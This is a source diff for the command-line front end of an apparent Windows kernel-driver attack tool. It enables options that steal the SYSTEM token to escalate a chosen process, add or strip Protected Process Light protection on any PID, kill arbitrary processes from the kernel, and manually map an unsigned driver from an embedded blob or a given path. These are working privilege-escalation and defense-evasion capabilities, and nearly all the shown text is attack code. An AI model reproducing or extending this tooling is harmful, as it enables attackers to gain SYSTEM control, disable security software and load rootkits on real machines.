@@ -155,13 +155,13 @@ done:
 
 
 
-int main(int args, char** argv)
+int main(int argc, char** argv)
 {
 	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink
 
 
-	/*DWORD EPROCESS_TOKEN_OFFSET = 0;
+	DWORD EPROCESS_TOKEN_OFFSET = 0;
 	DWORD ProtectionOffset		= 0;
 	DWORD SignatureLevelOffset	= 0;
 	DWORD buildNumber = GetWindowsBuildNumber();
@@ -198,7 +198,7 @@ int main(int args, char** argv)
 	else
 	{
 		return -1;
-	}*/
+	}
 
 	constexpr std::string_view art = R"(
 
@@ -233,34 +233,120 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		return 1;
 	}
 
-	// Test Kill Process
-	//ULONG nPid = atoi(argv[1]);
+	BOOLEAN bOprOfPPL{ FALSE };
+	BOOLEAN bAdd{ FALSE };	// true add false remove
+	BOOLEAN bPrivilegeEscalation{ FALSE };
+	BOOLEAN bKillProcess{ FALSE };
+	ULONG nTargetPid{ 0 };
 
-	////Sleep(10000);
-	//DriverWorker::Kill(nPid);
+	BOOLEAN bMapping{ FALSE };
+	std::string strMappingDriver;
 
-	/*ULONG64 SystemProcess{ 0 };
-	ULONG64 CurrentProcess{ 0 };
-
-	auto nResult = GetObjectPointer(&SystemProcess, 4, ULongToHandle(4));
-	if (nResult != 0 || SystemProcess == 0)
+	// parse command line
+	for (size_t i = 1; i < argc; i++)
 	{
-		LOG("[-] GetObjectPtr failed for system process with error code: " << nResult);
-		return nResult;
+		std::string arg = argv[i];
+
+		if (arg == "--ppl" || arg == "--PPL")
+		{
+			bOprOfPPL = TRUE;
+		}
+
+		else if (arg == "-add" || arg == "-a" || arg == "-ADD" || arg == "-A")
+		{
+			if (i + 1 < argc)   //  PID
+			{
+				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
+			}
+			bAdd = TRUE;
+		}
+
+		else if (arg == "-rve" || arg == "-r" || arg == "-RVE" || arg == "-R")
+		{
+			if (i + 1 < argc)   //  PID
+			{
+				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
+			}
+			bAdd = FALSE;
+		}
+
+		else if (arg == "--PriEsc" || arg == "--PS")
+		{
+			if (i + 1 < argc)   //  PID
+			{
+				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
+			}
+
+			bPrivilegeEscalation = TRUE;
+		}
+
+		else if (arg == "--KillProcess" || arg == "--k" || arg == "--K" || arg == "-k" || arg == "-K")
+		{
+			if (i + 1 < argc)   //  PID
+			{
+				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
+			}
+
+			bKillProcess = TRUE;
+		}
+
+		else if (arg == "--map" || 
+			arg == "--m" || 
+			arg == "--M" ||
+			arg == "-m"||
+			arg == "-M")
+		{
+			if (i + 1 < argc)
+			{
+				strMappingDriver = argv[++i];
+			}
+
+			bMapping = TRUE;
+		}
+
+		else if (arg == "-h" || arg == "--help")
+		{
+			SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+			std::cout << "用法:\n"
+				<< "  --ppl -add <PID>      提升为 PPL\n"
+				<< "  --ppl -rve <PID>      移除 PPL 保护\n"
+				<< "  --PriEsc <PID>        权限提升\n"
+				<< "  --KillProcess <PID>   结束进程\n"
+				<< "  --map <路径>           映射驱动\n";
+			SetConsoleTextAttribute(hConsole, 7);
+			return 0;
+		}
 	}
 
-	auto hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
-	if (!hCurrentProcess)
-	{
-		LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
-	}
-	nResult = GetObjectPointer(&CurrentProcess, GetCurrentProcessId(), hCurrentProcess);
-	if (nResult != 0 || CurrentProcess == 0)
-	{
-		LOG("[-] GetObjectPtr failed for current process with error code: " << nResult);
-		return nResult;
-	}*/
 
+	ULONG64 SystemProcess{ 0 };
+	ULONG64 TargetProcess{ 0 };
+
+	if (bOprOfPPL || bPrivilegeEscalation)
+	{
+		auto nResult = GetObjectPointer(&SystemProcess, 4, ULongToHandle(4));
+		if (nResult != 0 || SystemProcess == 0)
+		{
+			LOG("[-] GetObjectPtr failed for system process with error code: " << nResult);
+			return nResult;
+		}
+
+		if (nTargetPid == 0)
+		{
+			nTargetPid = GetCurrentProcessId();
+			auto hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nTargetPid);
+			if (!hTargetProcess)
+			{
+				LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
+			}
+			nResult = GetObjectPointer(&TargetProcess, nTargetPid, hTargetProcess);
+			if (nResult != 0 || TargetProcess == 0)
+			{
+				LOG("[-] GetObjectPtr failed for target process with error code: " << nResult);
+				return nResult;
+			}
+		}
+	}
 
 	auto initResult = DriverWorker::InitializeDriver();
 	if (!initResult)
@@ -269,43 +355,70 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		return 1;
 	}
 
-	//SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
-
-	//DriverLoader::PrivilegeEscalation(SystemProcess, CurrentProcess, EPROCESS_TOKEN_OFFSET);
-	//
-	//SetConsoleTextAttribute(hConsole, 7);
-
-	////DriverLoader::PS_PROTECTION protection{};
-	//////protection.Level = 0x01; // Protected Light
-	////protection.Type		= DriverLoader::PsProtectedTypeProtected;
-	////protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
-
-	////DriverLoader::SetProcessProtection(CurrentProcess, ProtectionOffset, &protection);
-
-	// MessageBoxA(nullptr,
-	//			"If you see this message box, the process is still alive. Click OK to spawn a SYSTEM shell.",
-	//			"Process Status",
-	//			MB_OK);
-	//
-
-	// loader mapping driver
-
-	do
+	if (bOprOfPPL && bAdd)
 	{
-		auto initMemoryResult = DriverLoader::InitMemoryManager();
-		if (!initMemoryResult)
-		{
-			LOG("[-] Failed to initialize memory manager");
-			break;
-		}
+		DriverLoader::PS_PROTECTION protection{};
+		//protection.Level = 0x01; // Protected Light
+		protection.Type		= DriverLoader::PsProtectedTypeProtected;
+		protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
 
-		SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
-		DriverLoader::MapperDriver(Mapper::hexData);
+		DriverLoader::SetProcessProtection(TargetProcess, ProtectionOffset, &protection);
+	}
+	else if (bOprOfPPL && !bAdd)
+	{
+		DriverLoader::PS_PROTECTION protection{};
+		protection.Level = 0;
+
+		DriverLoader::SetProcessProtection(TargetProcess, ProtectionOffset, &protection);
+	}
+	else if (bPrivilegeEscalation)
+	{
+		SetConsoleTextAttribute(hConsole, 9);	// Bright Blue
+		DriverLoader::PrivilegeEscalation(SystemProcess, TargetProcess, EPROCESS_TOKEN_OFFSET);
 		SetConsoleTextAttribute(hConsole, 7);
+	}
+	else if (bKillProcess)
+	{
+		DriverWorker::Kill(nTargetPid);
+	}
+	else if (bMapping)
+	{
+		if (strMappingDriver.empty())
+		{
+			do
+			{
+				auto initMemoryResult = DriverLoader::InitMemoryManager();
+				if (!initMemoryResult)
+				{
+					LOG("[-] Failed to initialize memory manager");
+					break;
+				}
 
-	} while (FALSE);
+				SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+				DriverLoader::MapperDriver(Mapper::hexData);
+				SetConsoleTextAttribute(hConsole, 7);
 
+			} while (FALSE);
+		}
+		else
+		{
+			do
+			{
+				auto initMemoryResult = DriverLoader::InitMemoryManager();
+				if (!initMemoryResult)
+				{
+					LOG("[-] Failed to initialize memory manager");
+					break;
+				}
 
+				SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+				DriverLoader::MapperDriver(strMappingDriver);
+				SetConsoleTextAttribute(hConsole, 7);
+
+			} while (FALSE);
+		}
+	}
+	
 	DriverWorker::UninitializeDriver();
 
 	system("pause");
